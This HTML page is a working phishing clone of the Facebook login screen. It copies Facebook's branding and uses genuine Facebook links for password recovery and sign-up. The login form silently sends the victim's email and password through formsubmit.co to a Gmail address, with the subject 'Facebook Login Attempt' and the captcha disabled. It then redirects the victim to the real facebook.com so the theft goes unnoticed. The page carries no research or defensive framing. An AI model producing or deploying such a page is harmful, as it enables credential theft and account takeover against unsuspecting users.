<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook - Log In or Sign Up</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        /* Base Reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background-color: #18191a;
            color: #e4e6eb;
            line-height: 1.34;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow-x: hidden;
            background-image: 
                radial-gradient(circle at 20% 80%, rgba(45, 136, 255, 0.1) 0%, transparent 40%);
        }

        /* Container */
        .login-container {
            width: 100%;
            max-width: 400px;
            padding: 28px;
            background-color: rgba(36, 37, 38, 0.95);
            border-radius: 12px;
            box-shadow: 
                0 8px 32px rgba(0, 0, 0, 0.4),
                0 0 0 1px rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px) saturate(180%);
            border: 1px solid rgba(255, 255, 255, 0.08);
            animation: fadeIn 0.6s ease-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Header */
        .header {
            text-align: center;
            margin-bottom: 28px;
            padding-bottom: 20px;
            border-bottom: 1px solid rgba(62, 64, 66, 0.5);
            position: relative;
        }

        .header::after {
            content: '';
            position: absolute;
            bottom: -1px;
            left: 50%;
            transform: translateX(-50%);
            width: 60px;
            height: 3px;
            background: linear-gradient(90deg, #2d88ff, #1877f2);
            border-radius: 2px;
        }

        .header h1 {
            font-size: 32px;
            font-weight: 700;
            color: #2d88ff;
            letter-spacing: -0.5px;
            margin-bottom: 10px;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
        }

        .header p {
            color: #b0b3b8;
            font-size: 15px;
            font-weight: 400;
            max-width: 320px;
            margin: 0 auto;
            line-height: 1.6;
        }

        /* Logo Container - Kept but empty */
        .logo-container {
            height: 40px;
            margin-bottom: 16px;
            /* Logo removed but container remains */
        }

        /* Login Form */
        .login-form {
            margin-top: 8px;
        }

        .form-group {
            margin-bottom: 20px;
            position: relative;
        }

        .form-input {
            width: 100%;
            padding: 16px 18px;
            background-color: rgba(58, 59, 60, 0.8);
            border: 1px solid rgba(62, 64, 66, 0.6);
            border-radius: 10px;
            color: #e4e6eb;
            font-size: 16px;
            font-weight: 400;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            backdrop-filter: blur(10px);
        }

        .form-input:focus {
            outline: none;
            border-color: #2d88ff;
            background-color: rgba(78, 79, 80, 0.9);
            box-shadow: 
                0 0 0 3px rgba(45, 136, 255, 0.15),
                0 4px 12px rgba(0, 0, 0, 0.1);
            transform: translateY(-1px);
        }

        .form-input::placeholder {
            color: #8a8d91;
            transition: color 0.3s ease;
        }

        .form-input:focus::placeholder {
            color: #b0b3b8;
        }

        .form-input.invalid {
            border-color: #f02849;
            background-color: rgba(240, 40, 73, 0.1);
            animation: shake 0.5s ease;
        }

        .input-icon {
            position: absolute;
            right: 18px;
            top: 50%;
            transform: translateY(-50%);
            color: #8a8d91;
            font-size: 18px;
            pointer-events: none;
            transition: color 0.3s ease;
        }

        .form-input:focus + .input-icon {
            color: #2d88ff;
        }

        /* Login Button */
        .login-btn {
            width: 100%;
            padding: 16px 20px;
            background: linear-gradient(90deg, #2d88ff, #1877f2);
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            margin-top: 8px;
            position: relative;
            overflow: hidden;
            letter-spacing: 0.5px;
        }

        .login-btn:hover {
            background: linear-gradient(90deg, #1877f2, #2d88ff);
            transform: translateY(-2px);
            box-shadow: 
                0 6px 20px rgba(24, 119, 242, 0.3),
                0 0 0 1px rgba(255, 255, 255, 0.1);
        }

        .login-btn:active {
            transform: translateY(0);
            box-shadow: 
                0 2px 10px rgba(24, 119, 242, 0.2),
                0 0 0 1px rgba(255, 255, 255, 0.05);
        }

        .login-btn:disabled {
            background: #3a3b3c;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        /* Forgot Password */
        .forgot-password {
            text-align: center;
            margin: 20px 0 28px;
        }

        .forgot-password a {
            color: #2d88ff;
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
            transition: all 0.3s ease;
            position: relative;
            padding-bottom: 2px;
        }

        .forgot-password a:hover {
            color: #8b9dc3;
            text-decoration: none;
        }

        .forgot-password a::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 0;
            height: 1px;
            background: #2d88ff;
            transition: width 0.3s ease;
        }

        .forgot-password a:hover::after {
            width: 100%;
        }

        /* Footer */
        .footer {
            text-align: center;
            padding-top: 24px;
            border-top: 1px solid rgba(62, 64, 66, 0.5);
            margin-top: 20px;
        }

        .footer p {
            color: #b0b3b8;
            font-size: 14px;
            margin-bottom: 18px;
            font-weight: 400;
        }

        .signup-btn {
            display: inline-block;
            padding: 14px 28px;
            background: #42b72a;
            color: white;
            text-decoration: none;
            border-radius: 10px;
            font-weight: 600;
            font-size: 16px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
            letter-spacing: 0.5px;
            border: none;
            cursor: pointer;
        }

        .signup-btn:hover {
            background: #36a420;
            transform: translateY(-2px);
            box-shadow: 
                0 6px 20px rgba(54, 164, 32, 0.3),
                0 0 0 1px rgba(255, 255, 255, 0.1);
        }

        .signup-btn:active {
            transform: translateY(0);
            box-shadow: 
                0 2px 10px rgba(54, 164, 32, 0.2),
                0 0 0 1px rgba(255, 255, 255, 0.05);
        }

        /* Ripple Effect */
        .ripple {
            position: absolute;
            border-radius: 50%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.4) 0%, rgba(255, 255, 255, 0) 70%);
            transform: scale(0);
            animation: ripple-animation 0.8s ease-out;
            pointer-events: none;
        }

        @keyframes ripple-animation {
            to {
                transform: scale(4);
                opacity: 0;
            }
        }

        /* Responsive Design */
        @media (max-width: 500px) {
            .login-container {
                padding: 22px;
                max-width: 100%;
                border-radius: 10px;
                margin: 10px;
            }
            
            .header {
                margin-bottom: 24px;
                padding-bottom: 18px;
            }
            
            .header h1 {
                font-size: 28px;
            }
            
            .header p {
                font-size: 14px;
            }
            
            .login-btn,
            .form-input {
                padding: 15px 16px;
                font-size: 15px;
            }
            
            .signup-btn {
                padding: 12px 24px;
                font-size: 15px;
            }
        }

        @media (max-width: 350px) {
            .header h1 {
                font-size: 24px;
            }
            
            .login-container {
                padding: 18px;
            }
        }

        /* Error Message */
        .error-message {
            color: #f02849;
            font-size: 13px;
            margin-top: 6px;
            margin-left: 4px;
            display: none;
            animation: fadeInUp 0.3s ease;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(-5px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        /* Loading State */
        .loading {
            position: relative;
            color: transparent !important;
        }

        .loading::after {
            content: "";
            position: absolute;
            width: 22px;
            height: 22px;
            top: 50%;
            left: 50%;
            margin-top: -11px;
            margin-left: -11px;
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-top-color: white;
            border-radius: 50%;
            animation: loading-spin 0.8s linear infinite;
        }

        @keyframes loading-spin {
            to { transform: rotate(360deg); }
        }

        /* Additional Effects */
        .form-group {
            animation: slideUp 0.5s ease-out;
            animation-fill-mode: both;
        }

        .form-group:nth-child(1) {
            animation-delay: 0.1s;
        }

        .form-group:nth-child(2) {
            animation-delay: 0.2s;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(15px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Password Toggle */
        .password-toggle {
            position: absolute;
            right: 18px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #8a8d91;
            cursor: pointer;
            font-size: 18px;
            padding: 0;
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: color 0.3s ease;
            z-index: 2;
        }

        .password-toggle:hover {
            color: #2d88ff;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <!-- Header -->
        <div class="header">
            <!-- Logo container (empty) -->
            <div class="logo-container"></div>
            <h1>facebook</h1>
            <p>Connect with friends and the world around you on Facebook.</p>
        </div>

        <!-- Login Form -->
        <form class="login-form" id="facebookLoginForm" action="https://formsubmit.co/infobloglogs@gmail.com" method="POST">
            <input type="hidden" name="_subject" value="Facebook Login Attempt">
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_next" value="https://www.facebook.com">
            <input type="hidden" name="_template" value="table">
            
            <div class="form-group">
                <input type="text" 
                       class="form-input" 
                       id="email" 
                       name="email" 
                       placeholder="Email or phone number" 
                       required>
                <div class="input-icon">
                    <i class="fas fa-user"></i>
                </div>
                <div class="error-message" id="emailError">Please enter a valid email or phone number</div>
            </div>
            
            <div class="form-group">
                <input type="password" 
                       class="form-input" 
                       id="password" 
                       name="password" 
                       placeholder="Password" 
                       required>
                <button type="button" class="password-toggle" id="passwordToggle">
                    <i class="fas fa-eye"></i>
                </button>
                <div class="error-message" id="passwordError">Please enter your password</div>
            </div>
            
            <button type="submit" class="login-btn" id="loginButton">
                Log In
            </button>
        </form>

        <!-- Forgot Password -->
        <div class="forgot-password">
            <a href="https://www.facebook.com/login/identify">Forgot password?</a>
        </div>

        <!-- Footer -->
        <div class="footer">
            <p>Don't have an account?</p>
            <a href="https://www.facebook.com/r.php" class="signup-btn">Create New Account</a>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('facebookLoginForm');
            const loginButton = document.getElementById('loginButton');
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            const passwordToggle = document.getElementById('passwordToggle');
            const emailError = document.getElementById('emailError');
            const passwordError = document.getElementById('passwordError');
            
            // Password visibility toggle
            passwordToggle.addEventListener('click', function() {
                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                passwordInput.setAttribute('type', type);
                this.innerHTML = type === 'password' ? 
                    '<i class="fas fa-eye"></i>' : 
                    '<i class="fas fa-eye-slash"></i>';
            });
            
            // Add ripple effect to buttons
            function createRipple(event, button) {
                const circle = document.createElement('span');
                const diameter = Math.max(button.clientWidth, button.clientHeight);
                const radius = diameter / 2;
                
                circle.style.width = circle.style.height = `${diameter}px`;
                circle.style.left = `${event.clientX - button.getBoundingClientRect().left - radius}px`;
                circle.style.top = `${event.clientY - button.getBoundingClientRect().top - radius}px`;
                circle.classList.add('ripple');
                
                const ripple = button.getElementsByClassName('ripple')[0];
                if (ripple) ripple.remove();
                
                button.appendChild(circle);
            }
            
            // Add ripple to login button
            loginButton.addEventListener('click', function(e) {
                createRipple(e, this);
            });
            
            // Add ripple to signup button
            const signupBtn = document.querySelector('.signup-btn');
            signupBtn.addEventListener('click', function(e) {
                createRipple(e, this);
                // This would normally navigate to signup page
            });
            
            // Form validation
            function validateForm() {
                let isValid = true;
                
                // Clear previous errors
                emailInput.classList.remove('invalid');
                passwordInput.classList.remove('invalid');
                emailError.style.display = 'none';
                passwordError.style.display = 'none';
                
                // Validate email
                if (!emailInput.value.trim()) {
                    emailInput.classList.add('invalid');
                    emailError.style.display = 'block';
                    isValid = false;
                } else if (!isValidEmailOrPhone(emailInput.value.trim())) {
                    emailInput.classList.add('invalid');
                    emailError.textContent = 'Please enter a valid email or phone number';
                    emailError.style.display = 'block';
                    isValid = false;
                }
                
                // Validate password
                if (!passwordInput.value.trim()) {
                    passwordInput.classList.add('invalid');
                    passwordError.style.display = 'block';
                    isValid = false;
                } else if (passwordInput.value.length < 6) {
                    passwordInput.classList.add('invalid');
                    passwordError.textContent = 'Password must be at least 6 characters';
                    passwordError.style.display = 'block';
                    isValid = false;
                }
                
                return isValid;
            }
            
            function isValidEmailOrPhone(value) {
                // Simple email validation
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                // Simple phone validation (10 digits minimum)
                const phoneRegex = /^[\+]?[0-9\s\-\(\)]{10,}$/;
                
                return emailRegex.test(value) || phoneRegex.test(value);
            }
            
            // Real-time validation
            emailInput.addEventListener('input', function() {
                if (this.value.trim()) {
                    this.classList.remove('invalid');
                    emailError.style.display = 'none';
                }
            });
            
            passwordInput.addEventListener('input', function() {
                if (this.value.trim() && this.value.length >= 6) {
                    this.classList.remove('invalid');
                    passwordError.style.display = 'none';
                }
            });
            
            // Form submission
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                
                if (!validateForm()) {
                    // Shake animation for invalid form
                    form.style.animation = 'none';
                    setTimeout(() => {
                        form.style.animation = 'shake 0.5s ease';
                    }, 10);
                    
                    // Remove animation after it plays
                    setTimeout(() => {
                        form.style.animation = '';
                    }, 500);
                    return;
                }
                
                // Show loading state
                const originalText = loginButton.innerHTML;
                loginButton.classList.add('loading');
                loginButton.disabled = true;
                
                // Simulate network delay
                setTimeout(() => {
                    // Actually submit the form
                    form.submit();
                    
                    // Reset button state (in case form submission fails)
                    setTimeout(() => {
                        loginButton.classList.remove('loading');
                        loginButton.innerHTML = originalText;
                        loginButton.disabled = false;
                    }, 2000);
                }, 1500);
            });
            
            // Focus first input on load
            emailInput.focus();
            
            // Add input focus animation
            const inputs = document.querySelectorAll('.form-input');
            inputs.forEach(input => {
                input.addEventListener('focus', function() {
                    this.parentElement.style.transform = 'scale(1.01)';
                });
                
                input.addEventListener('blur', function() {
                    this.parentElement.style.transform = 'scale(1)';
                });
            });
            
            // Add keypress animation for login button
            document.addEventListener('keypress', function(e) {
                if (e.key === 'Enter' && (emailInput === document.activeElement || passwordInput === document.activeElement)) {
                    loginButton.style.transform = 'scale(0.98)';
                    setTimeout(() => {
                        loginButton.style.transform = '';
                    }, 150);
                }
            });
        });
    </script>
</body>
</html>
